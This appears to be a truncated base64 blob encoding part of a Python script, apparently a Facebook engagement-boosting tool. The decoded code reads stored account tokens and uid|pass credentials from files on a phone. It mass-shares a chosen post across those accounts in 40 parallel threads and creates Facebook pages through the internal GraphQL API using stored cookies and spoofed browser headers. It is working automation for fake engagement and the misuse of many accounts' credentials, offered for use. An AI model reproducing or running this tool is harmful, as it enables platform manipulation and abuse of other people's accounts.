1VOVC50eHQiKQogICAgICAgIGV4dHJhY3RfdHlwZSA9ICdhY2NvdW50JwogICAgZWxpZiBzYXZlX2Nob2ljZSA9PSAnMic6CiAgICAgICAgYWNjb3VudF9maWxlID0gb3MucGF0aC5qb2luKGZvbGRlcl9wYXRoLCAiRlJBUEFHRVMudHh0IikKICAgICAgICBleHRyYWN0X3R5cGUgPSAncGFnZScKICAgIGVsaWYgc2F2ZV9jaG9pY2UgPT0gJzMnOgogICAgICAgIGFjY291bnRfZmlsZSA9IG9zLnBhdGguam9pbihmb2xkZXJfcGF0aCwgIlJQV0FDQ09VTlQudHh0IikKICAgICAgICBleHRyYWN0X3R5cGUgPSAnYWNjb3VudCcKICAgIGVsaWYgc2F2ZV9jaG9pY2UgPT0gJzQnOgogICAgICAgIGFjY291bnRfZmlsZSA9IG9zLnBhdGguam9pbihmb2xkZXJfcGF0aCwgIlJQV1BBR0VTLnR4dCIpCiAgICAgICAgZXh0cmFjdF90eXBlID0gJ3BhZ2UnCiAgICBlbHNlOgogICAgICAgIHByaW50KCJJbnZhbGlkIGNob2ljZS4gRXhpdGluZy4iKQogICAgICAgIHJldHVybgoKICAgIHByaW50KGYiICAgIFwwMzNbMzRt4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSAXDAzM1swbSIpCiAgICBwcmludChmIiAgICAgXDAzM1szM21USEUgRk9STUFUIFNIT1VMRCBCRSBcMDMzWzMxbXVpZHxwYXNzIikKICAgIHByaW50KGYiICAgIFwwMzNbMzRt4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSAXDAzM1swbSIpCiAgICBmaWxlX3BhdGggPSBpbnB1dChmIiAgICAgXDAzM1szM21QQVRIOiAiKS5zdHJpcCgpCgogICAgdG9rZW5fb3V0cHV0X3BhdGggPSBhY2NvdW50X2ZpbGUKCiAgICBwcm96KGZpbGVfcGF0aCwgdG9rZW5fb3V0cHV0X3BhdGgsIGV4dHJhY3RfdHlwZSkKCgpkZWYgZ2V0X3Rva2VuX2Zyb21fZmlsZShmaWxlX3BhdGgpOgogICAgIiIiUmVhZCB0b2tlbnMgZnJvbSB0aGUgZmlsZSBhbmQgcmV0dXJuIGEgcmFuZG9tIHRva2VuLiIiIgogICAgd2l0aCBvcGVuKGZpbGVfcGF0aCwgJ3InKSBhcyBmaWxlOgogICAgICAgIGxpbmVzID0gZmlsZS5yZWFkbGluZXMoKQogICAgICAgIHRva2VucyA9IFtsaW5lLnN0cmlwKCkuc3BsaXQoJ3wnKVsxXSBmb3IgbGluZSBpbiBsaW5lcyBpZiAnfCcgaW4gbGluZV0KICAgIHJldHVybiByYW5kb20uY2hvaWNlKHRva2VucykKCmNsYXNzIEZhY2Vib29rUG9zdGVyOgogICAgZGVmIF9faW5pdF9fKHNlbGYsIGxpbmspOgogICAgICAgIHNlbGYubGluayA9IGxpbmsKCiAgICBkZWYgc2hhcmVfcG9zdChzZWxmLCB0b2tlbik6CiAgICAgICAgIiIiU2hhcmVzIGEgcG9zdCBvbiB0aGUgdXNlcidzIGZlZWQgd2l0aCAnT25seSBNZScgcHJpdmFjeS4iIiIKICAgICAgICB1cmwgPSAiaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vdjEzLjAvbWUvZmVlZCIKICAgICAgICBwYXlsb2FkID0gewogICAgICAgICAgICAnbGluayc6IHNlbGYubGluaywKICAgICAgICAgICAgJ3B1Ymxpc2hlZCc6ICcwJywKICAgICAgICAgICAgJ3ByaXZhY3knOiAneyJ2YWx1ZSI6IlNFTEYifScsCiAgICAgICAgICAgICdhY2Nlc3NfdG9rZW4nOiB0b2tlbgogICAgICAgIH0KICAgICAgICB0cnk6CiAgICAgICAgICAgIHJlc3BvbnNlID0gcmVxdWVzdHMucG9zdCh1cmwsIGRhdGE9cGF5bG9hZCkKICAgICAgICAgICAgcHJpbnQocmVzcG9uc2UpCiAgICAgICAgICAgIGlmIHJlc3BvbnNlLnN0YXR1c19jb2RlID09IDIwMDoKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgcHJpbnQoZiIgICAge2JsdWV94pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSAXDAzM1swbSIpCiAgICAgICAgICAgICAgICBwcmludCgiICAgICAgU3VjY2Vzc2Z1bGx5IFNoYXJlZCIpCiAgICAgICAgICAgICAgICByZXR1cm4gVHJ1ZQogICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgcmV0dXJuIEZhbHNlCiAgICAgICAgZXhjZXB0IHJlcXVlc3RzLmV4Y2VwdGlvbnMuUmVxdWVzdEV4Y2VwdGlvbiBhcyBlOgogICAgICAgICAgICBwcmludChmIkFuIGVycm9yIG9jY3VycmVkOiB7ZX0iKQogICAgICAgICAgICByZXR1cm4gRmFsc2UKCmRlZiBzaGFyZV9pbl90aHJlYWRzKGxpbmssIGZpbGVfcGF0aCwgbnVtX3NoYXJlcyk6CiAgICBzdGFydF9hbGwgPSB0aW1lLnRpbWUoKSAgIyBSZWNvcmQgdGhlIHN0YXJ0IHRpbWUgZm9yIHRoZSBlbnRpcmUgb3BlcmF0aW9uCiAgICAKICAgIGRlZiB3b3JrZXIoKToKICAgICAgICBzdWNjZXNzID0gRmFsc2UKICAgICAgICB3aGlsZSBub3Qgc3VjY2VzczoKICAgICAgICAgICAgdG9rZW4gPSBnZXRfdG9rZW5fZnJvbV9maWxlKGZpbGVfcGF0aCkKICAgICAgICAgICAgZmJfcG9zdGVyID0gRmFjZWJvb2tQb3N0ZXIobGluaykKICAgICAgICAgICAgc3VjY2VzcyA9IGZiX3Bvc3Rlci5zaGFyZV9wb3N0KHRva2VuKQoKICAgIG1heF93b3JrZXJzID0gNDAKICAgIHdpdGggVGhyZWFkUG9vbEV4ZWN1dG9yKG1heF93b3JrZXJzPW1heF93b3JrZXJzKSBhcyBleGVjdXRvcjoKICAgICAgICBmb3IgXyBpbiByYW5nZShudW1fc2hhcmVzKToKICAgICAgICAgICAgZXhlY3V0b3Iuc3VibWl0KHdvcmtlcikKCiAgICBlbmRfYWxsID0gdGltZS50aW1lKCkgICMgUmVjb3JkIHRoZSBlbmQgdGltZSBmb3IgdGhlIGVudGlyZSBvcGVyYXRpb24KICAgIGR1cmF0aW9uID0gZW5kX2FsbCAtIHN0YXJ0X2FsbAogICAgcHJpbnQoZiIgICAge2JsdWV94pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSAXDAzM1swbSIpCiAgICBwcmludChmIlxuICB7eWVsbG93fVNoYXJpbmcgc3RhcnRlZDoge3N0YXJ0X2FsbH0iKQogICAgcHJpbnQoZiIgICAge2JsdWV94pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSAXDAzM1swbSIpCiAgICBwcmludChmIiAgICAge3llbGxvd31TaGFyaW5nIGVuZGVkOiB7ZW5kX2FsbH0iKQogICAgcHJpbnQoZiIgICAge2JsdWV94pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSAXDAzM1swbSIpCiAgICBwcmludChmIiAgICB7eWVsbG93fVRvdGFsIGR1cmF0aW9uOiB7ZHVyYXRpb246LjJmfSBzZWNvbmRzXDAzM1swbSIpCmRlZiBjb3VudF90b2tlbnMoYWNjb3VudHNfZmlsZSwgcGFnZXNfZmlsZSk6CiAgICAiIiJDb3VudCB0aGUgbnVtYmVyIG9mIGFjY291bnRzIGFuZCBwYWdlcyBzdG9yZWQgaW4gdGhlIHJlc3BlY3RpdmUgZmlsZXMuIiIiCiAgICB0b3RhbF9hY2NvdW50cyA9IDAKICAgIHRvdGFsX3BhZ2VzID0gMAoKICAgIHRyeToKICAgICAgICB3aXRoIG9wZW4oYWNjb3VudHNfZmlsZSwgJ3InKSBhcyBhZjoKICAgICAgICAgICAgdG90YWxfYWNjb3VudHMgPSBzdW0oMSBmb3IgbGluZSBpbiBhZiBpZiBsaW5lLnN0cmlwKCkpICAjIENvdW50IG5vbi1lbXB0eSBsaW5lcwogICAgZXhjZXB0IEZpbGVOb3RGb3VuZEVycm9yOgogICAgICAgIHByaW50KGYiQWNjb3VudCBmaWxlIG5vdCBmb3VuZDoge2FjY291bnRzX2ZpbGV9IikKCiAgICB0cnk6CiAgICAgICAgd2l0aCBvcGVuKHBhZ2VzX2ZpbGUsICdyJykgYXMgcGY6CiAgICAgICAgICAgIHRvdGFsX3BhZ2VzID0gc3VtKDEgZm9yIGxpbmUgaW4gcGYgaWYgbGluZS5zdHJpcCgpKSAgIyBDb3VudCBub24tZW1wdHkgbGluZXMKICAgIGV4Y2VwdCBGaWxlTm90Rm91bmRFcnJvcjoKICAgICAgICBwcmludChmIlBhZ2UgZmlsZSBub3QgZm91bmQ6IHtwYWdlc19maWxlfSIpCgogICAgcmV0dXJuIHRvdGFsX2FjY291bnRzLCB0b3RhbF9wYWdlcwpkZWYgc2hhcmUoKToKICAgIGNsZWFyX3NjcmVlbigpCiAgICBqb3ZhbigpCiAgICBwcmludChmIiIiICAgICBcMDMzWzE7MzdtQ0hPT1NFIFRZUEUgT0YgQUNDT1VOVFMgVE8gQVVUTyBTSEFSRTogCiAgICAgXDAzM1sxOzM0bVsxXSBcMDMzWzE7MzJtRlJBIEFDQ09VTlQgCiAgICAgXDAzM1sxOzMxbVswXSBcMDMzWzE7MzFtRVhJVCAKICAgIFwwMzNbMTszNG3ilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIBcMDMzWzBtIiIiKQogICAgY2hvaWNlID0gaW5wdXQoZiIgICAgIHtibHVlfUNob2ljZSAiKQogICAgCiAgICBmaWxlX21hcCA9IHsKICAgICAgICAnMSc6ICcvc2RjYXJkL2Jvb3N0cGhlcmUvRlJBQUNDT1VOVC50eHQnLAogICAgICAgICcyJzogJy9zZGNhcmQvYm9vc3RwaGVyZS9GUkFQQUdFUy50eHQnLAogICAgICAgICczJzogJy9zZGNhcmQvYm9vc3RwaGVyZS9SUFdBQ0NPVU5ULnR4dCcsCiAgICAgICAgJzQnOiAnL3NkY2FyZC9ib29zdHBoZXJlL1JQV0FDQ09VTlQudHh0JwogICAgfQoKICAgIGZpbGVfcGF0aCA9IGZpbGVfbWFwLmdldChjaG9pY2UpCiAgICBpZiBub3QgZmlsZV9wYXRoOgogICAgICAgIHByaW50KCJJbnZhbGlkIGNob2ljZS4gRXhpdGluZy4iKQogICAgICAgIHJldHVybgoKICAgIHByaW50KGYiICAgIHtibHVlfeKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgFwwMzNbMG0iKQogICAgcG9zdF9pZCA9IGlucHV0KGYiICAge2dyZWVufUVudGVyIHRoZSBwb3N0IElEIHRvIHNoYXJlOiAiKQogICAgcHJpbnQoZiIgICAge2JsdWV94pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSAXDAzM1swbSIpCiAgICBudW1fc2hhcmVzID0gaW50KGlucHV0KGYiICAge2dyZWVufWhvdyBtYW55IHNoYXJlID8gOiAiKSkKCiAgICAjIENvbnN0cnVjdCB0aGUgbGluayB1c2luZyB0aGUgcG9zdCBJRAogICAgbGluayA9IGYiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL3twb3N0X2lkfSIKCiAgICBzaGFyZV9pbl90aHJlYWRzKGxpbmssIGZpbGVfcGF0aCwgbnVtX3NoYXJlcykKZGVmIG1haW4yKCk6IAogICAgZnJhYWNjb3VudHNfZmlsZSA9ICcvc2RjYXJkL2Jvb3N0cGhlcmUvRlJBQUNDT1VOVC50eHQnCiAgICBmcmFwYWdlc19maWxlID0gJy9zZGNhcmQvYm9vc3RwaGVyZS9GUkFQQUdFUy50eHQnCiAgICBycHdhY2NvdW50cyA9ICcvc2RjYXJkL2Jvb3N0cGhlcmUvUlBXQUNDT1VOVC50eHQnCiAgICBycHdwYWdlcyA9ICcvc2RjYXJkL2Jvb3N0cGhlcmUvUlBXUEFHRVMudHh0JwogICAgdG90YWxfYWNjb3VudHMsIHRvdGFsX3BhZ2VzID0gY291bnRfdG9rZW5zKGZyYWFjY291bnRzX2ZpbGUsIGZyYXBhZ2VzX2ZpbGUpCiAgICB0b3RhbF9hY2NvdW50X3JwdywgdG90YWxfcGFnZXNfcnB3ID0gY291bnRfdG9rZW5zKHJwd2FjY291bnRzLHJwd3BhZ2VzKQogICAgY2xlYXJfc2NyZWVuKCkKICAgIGpvdmFuKCkKICAgIHByaW50KGYiIiIgICAgICAgICAgICAgICAgIHt5ZWxsb3d9T1ZFUlZJRVcgT0YgU1RPUkVEIEFDQ09VTlQgJiBQQUdFU/CfkqsKICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAge2JsdWV9RlJBIEFDQ09VTlR7eWVsbG93fSA6IHtncmVlbn17dG90YWxfYWNjb3VudHN9CiAgICAgIHtibHVlfeKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgFwwMzNbMG0iIiIpCiAgICBwcmludChmIiAgICAge2JsdWV9WzFdIHt5ZWxsb3d9RVhUUkFDVCBBQ0NPVU5UIikKICAgIHByaW50KGYiICAgICB7Ymx1ZX1bMl0ge3llbGxvd31BVVRPIFNIQVJFICIpCiAgICBwcmludChmIiAgICB7Ymx1ZX3ilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIBcMDMzWzBtIikKICAgIGNob2ljZSA9IGlucHV0KGYnICAgIHt5ZWxsb3d9RW50ZXIgQ2hvaWNlOiAnKQogICAgaWYgY2hvaWNlID09ICcxJzogCiAgICAgICAgZXh0cmFjdGlvbigpCiAgICBpZiBjaG9pY2UgPT0gJzInOiAKICAgICAgICBzaGFyZSgpCgoKCmRlZiBleHRyYWN0aW9uKCk6CgogICAgY2xlYXJfc2NyZWVuKCkKICAgIGpvdmFuKCkKICAgIHByaW50KGYiICAgICB7d2hpdGV9WzFdIHt5ZWxsb3d9RVhUUkFDVCB7cmVkfUFDQ09VTlQiKQogICAgcHJpbnQoZiIgICAgIHt3aGl0ZX1bMl0ge3llbGxvd31FWFRSQUNUIHtyZWR9UEFHRVMiKQogICAgcHJpbnQoIiAgICAgXDAzM1sxOzM0beKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgFwwMzNbMG0iKQogICAgY2hvaWNlID0gaW5wdXQoZiIgICAgIHtncmVlbn1DSE9JQ0U6ICIpLnN0cmlwKCkgCiAgICBpZiBjaG9pY2UgPT0gJzEnOgogICAgICAgIGF4bDEoKQogICAgZWxpZiBjaG9pY2UgPT0gJzInOgogICAgICAgIGF4bDIoKQogICAgZWxzZToKICAgICAgICBwcmludChmIiAgICAge3JlZH1JTlZBTElEIENIT0lDRSIpCiAgICBkZWYgcmVnKHNlbGYsIG5hbWUpOgogICAgICAgIGhlYWRlcnMgPSB7CiAgICAgICAgICAgICdhdXRob3JpdHknOiAnd3d3LmZhY2Vib29rLmNvbScsCiAgICAgICAgICAgICdhY2NlcHQnOiAnKi8qJywKICAgICAgICAgICAgJ2FjY2VwdC1sYW5ndWFnZSc6ICd2aS1WTix2aTtxPTAuOSxmci1GUjtxPTAuOCxmcjtxPTAuNyxlbi1VUztxPTAuNixlbjtxPTAuNScsCiAgICAgICAgICAgICdjb29raWUnOiBzZWxmLmNvb2tpZXMsCiAgICAgICAgICAgICdvcmlnaW4nOiAnaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tJywKICAgICAgICAgICAgJ3JlZmVyZXInOiAnaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL3BhZ2VzL2NyZWF0aW9uP3JlZl90eXBlPWxhdW5jaF9wb2ludCcsCiAgICAgICAgICAgICdzZWMtY2gtcHJlZmVycy1jb2xvci1zY2hlbWUnOiAnZGFyaycsCiAgICAgICAgICAgICdzZWMtY2gtdWEnOiAnIkdvb2dsZSBDaHJvbWUiO3Y9IjEwNyIsICJDaHJvbWl1bSI7dj0iMTA3IiwgIk5vdD1BP0JyYW5kIjt2PSIyNCInLAogICAgICAgICAgICAnc2VjLWNoLXVhLW1vYmlsZSc6ICc/MCcsCiAgICAgICAgICAgICdzZWMtY2gtdWEtcGxhdGZvcm0nOiAnIldpbmRvd3MiJywKICAgICAgICAgICAgJ3NlYy1mZXRjaC1kZXN0JzogJ2VtcHR5JywKICAgICAgICAgICAgJ3NlYy1mZXRjaC1tb2RlJzogJ2NvcnMnLAogICAgICAgICAgICAnc2VjLWZldGNoLXNpdGUnOiAnc2FtZS1vcmlnaW4nLAogICAgICAgICAgICAndXNlci1hZ2VudCc6ICdNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMTA3LjAuMC4wIFNhZmFyaS81MzcuMzYnLAogICAgICAgICAgICAndmlld3BvcnQtd2lkdGgnOiAnOTc5JywKICAgICAgICAgICAgJ3gtZmItZnJpZW5kbHktbmFtZSc6ICdBZGRpdGlvbmFsUHJvZmlsZVBsdXNDcmVhdGlvbk11dGF0aW9uJywKICAgICAgICAgICAgJ3gtZmItbHNkJzogJ1pNN0ZBazZjdVJjVXAzaW13cXZIVFknLAogICAgICAgIH0KCiAgICAgICAgZGF0YSA9IHsKICAgICAgICAgICAgJ2F2Jzogc2VsZi5pZF9hY2MsCiAgICAgICAgICAgICdfX3VzZXInOiBzZWxmLmlkX2FjYywKICAgICAgICAgICAgJ19fYSc6ICcxJywKICAgICAgICAgICAgJ19fZHluJzogJzdBekh4cTFteHUxc3lVYkZ1QzBCVlU5OG53Z1UyOXpFZEVjOGNvNVMzTzJTN28xMVVlOGh3NnZ3Yi1xN29jODF4b3N3SXd1bzg4NkMxMXhtZno4MXNiem9hRW54TzBCbzdPMmwyVXR3d3dpODMxd2lFandad2xvNXFmSzZFN2U1OGp3R3pFOEZVNWU3b3FCd0pLMlc1b2x3dUVqVWxEdy13VXdzOW92VWFVM3F4V20yU3EyLWF6bzJOd2tRMHo4Yzg0SzJlM3UzNjItMkIwb29ibycsCiAgICAgICAgICAgICdfX2Nzcic6ICdnUDRaQU4yZC1oYmJSbUxPYmtaTzhMdlJjWFdWdnRoOWQ5R0dYS1NpTENxcXI5cUV6R1RvekFYaUNneUJoYkhyUkc4VmtRbThHRkFmeTk0Yko3eGV1Zno4aks4eUdWVkVneC03b2l3eHlwcUN3Z0Y4OHJ6S1Y4eTJPNG9jVWFrNFVwRHh1M3gxSzRvcEFVcndHeDYzSjBMdy13YTkwZUcxOHdrRTd5MTR3NGh3NkJ3Mi1vMDY5VzAwQ1NFMFBXMDZhVTAyWjN3alU2aTBidHczVEUxd0U1dScsCiAgICAgICAgICAgICdfX3JlcSc6ICd0JywKICAgICAgICAgICAgJ19faHMnOiAnMTkyOTYuSFlQOmNvbWV0X3BrZy4yLjEuMC4yLjEnLAogICAgICAgICAgICAnZHByJzogJzEnLAogICAgICAgICAgICAnX19jY2cnOiAnRVhDRUxMRU5UJywKICAgICAgICAgICAgJ19fcmV2JzogJzEwMDY0OTY0NzYnLAogICAgICAgICAgICAnX19zJzogJzFnYXBhYjp5NHh2M2Y6MmhiNG9zJywKICAgICAgICAgICAgJ19faHNpJzogJzcxNjA1NzMwMzcwOTY0OTI2ODknLAogICAgICAgICAgICAnX19jb21ldF9yZXEnOiAnMTUnLAogICAgICAgICAgICAnZmJfZHRzZyc6IHNlbGYuZmJfZHRzZywKICAgICAgICAgICAgJ2phem9lc3QnOiAnMjU0MDQnLAogICAgICAgICAgICAnbHNkJzogJ1pNN0ZBazZjdVJjVXAzaW13cXZIVFknLAogICAgICAgICAgICAnX19hYWlkJzogJzgwMDQ0NDM0NDU0NTM3NycsCiAgICAgICAgICAgICdfX3NwaW5fcic6ICcxMDA2NDk2NDc2JywKICAgICAgICAgICAgJ19fc3Bpbl9iJzogJ3RydW5rJywKICAgICAgICAgICAgJ19fc3Bpbl90JzogJzE2NjcyMDA4MjknLAogICAgICAgICAgICAnZmJfYXBpX2NhbGxlcl9jbGFzcyc6ICdSZWxheU1vZGVybicsCiAgICAgICAgICAgICdmYl9hcGlfcmVxX2ZyaWVuZGx5X25hbWUnOiAnQWRkaXRpb25hbFByb2ZpbGVQbHVzQ3JlYXRpb25NdXRhdGlvbicsCiAgICAgICAgICAgICd2YXJpYWJsZXMnOiAneyJpbnB1dCI6eyJiaW8iOiIiLCJjYXRlZ29yaWVzIjpbIjE4MTQ3NTU3NTIyMTA5NyJdLCJjcmVhdGlvbl9zb3VyY2UiOiJjb21ldCIsIm5hbWUiOiInICsgbmFtZSArICciLCJwYWdlX3JlZmVycmVyIjoibGF1bmNoX3BvaW50IiwiYWN0b3JfaWQiOiInICsgc2VsZi5pZF9hY2MgKyAnIiwiY2xpZW50X211dGF0aW9uX2lkIjoiMSJ9fScsCiAgICAgICAgICAgICdzZXJ2ZXJfdGltZXN0YW1wcyc6ICd0cnVlJywKICAgICAgICAgICAgJ2RvY19pZCc6ICc1OTAzMjIzOTA5NjkwODI1JywKICAgICAgICB9CgogICAgICAgIHJlc3BvbnNlID0gcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL2FwaS9ncmFwaHFsLycsIGhlYWRlcnM9aGVhZGVycywgZGF0YT1kYXRhKQoKICAgICAgICB0cnk6CiAgICAgICAgICAgIHJlc3VsdCA9IHJlc3BvbnNlLmpzb24oKQogICAgICAgICAgICBpZiAnaWQnIGluIHJlc3VsdDoKICAgICAgICAgICAgICAgIHBhZ2VfaWQgPSByZXN1bHRbJ2lkJ10KICAgICAgICAgICAgICAgIHNlbGYuc2V0X3Byb2ZpbGVfcGljdHVyZShwYWdlX2lkKQogICAgICAgICAgICByZXR1cm4gcmVzdWx0CiAgICAgICAgZXhjZXB0OgogICAgICAgICAgICByZXR1cm4gcmVzcG9uc2UudGV4dAoKICAgIGRlZiBzZXRfcHJvZmlsZV9waWN0dXJlKHNlbGYsIHBhZ2VfaWQpOgogICAgICAgIHBpY3R1cmVfcGF0aCA9ICIvaG9tZS9zcGFkZS9EZXNrdG9wL2xvYWQgZGF0YS9Qcm9maWxlLmpwZWciICAjIFJlcGxhY2Ugd2l0aCB5b3VyIGFjdHVhbCBwYXRoIHRvIHRoZSBwcm9maWxlIHBpY3R1cmUKICAgICAgICBoZWFkZXJzID0gewogICAgICAgICAgICAnYXV0aG9yaXR5JzogJ3d3dy5mYWNlYm9vay5jb20nLAogICAgICAgICAgICAnYWNjZXB0JzogJyovKicsCiAgICAgICAgICAgICdhY2NlcHQtbGFuZ3VhZ2UnOiAndmktVk4sdmk7cT0wLjksZnItRlI7cT0wLjgsZnI7cT0wLjcsZW4tVVM7cT0wLjYsZW47cT0wLjUnLAogICAgICAgICAgICAnY29va2llJzogc2VsZi5jb29raWVzLAogICAgICAgICAgICAnb3JpZ2luJzogJ2h0dHBzOi8vd3d3LmZhY2Vib29rLmNvbScsCiAgICAgICAgICAgICdyZWZlcmVyJzogZidodHRwczovL3d3dy5mYWNlYm9vay5jb20ve3BhZ2VfaWR9JywKICAgICAgICAgICAgJ3NlYy1jaC1wcmVmZXJzLWNvbG9yLXNjaGVtZSc6ICdkYXJrJywKICAgICAgICAgICAgJ3NlYy1jaC11YSc6ICciR29vZ2xlIENocm9tZSI7dj0iMTA3IiwgIkNocm9taXVtIjt2PSIxMDciLCAiTm90PUE/QnJhbmQiO3Y9IjI0IicsCiAgICAgICAgICAgICdzZWMtY2gtdWEtbW9iaWxlJzogJz8wJywKICAgICAgICAgICAgJ3NlYy1jaC11YS1wbGF0Zm9ybSc6ICciV2luZG93cyInLAogICAgICAgICAgICAnc2VjLWZldGNoLWRlc3QnOiAnZW1wdHknLAogICAgICAgICAgICAnc2VjLWZldGNoLW1vZGUnOiAnY29ycycsCiAgICAgICAgICAgICdzZWMtZmV0Y2gtc2l0ZSc6ICdzYW1lLW9yaWdpbicsCiAgICAgICAgICAgICd1c2VyLWFnZW50JzogJ01vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMDcuMC4wLjAgU2FmYXJpLzUzNy4zNicsCiAgICAgICAgICAgICd2aWV3cG9ydC13aWR0aCc6ICc5NzknLAogICAgICAgICAgICAneC1mYi1mcmllbmRseS1uYW1lJzogJ1Byb2ZpbGVQaWNVcGxvYWQnLAogICAgICAgICAgICAneC1mYi1sc2QnOiAnWk03RkFrNmN1UmNVcDNpbXdxdkhUWScsCiAgICAgICAgfQoKICAgICAgICBmaWxlcyA9IHsKICAgICAgICAgICAgJ3NvdXJjZSc6IChvcy5wYXRoLmJhc2VuYW1lKHBpY3R1cmVfcGF0aCksIG9wZW4ocGljdHVyZV9wYXRoLCAncmInKSwgJ2ltYWdlL2pwZWcnKQogICAgICAgIH0KCiAgICAg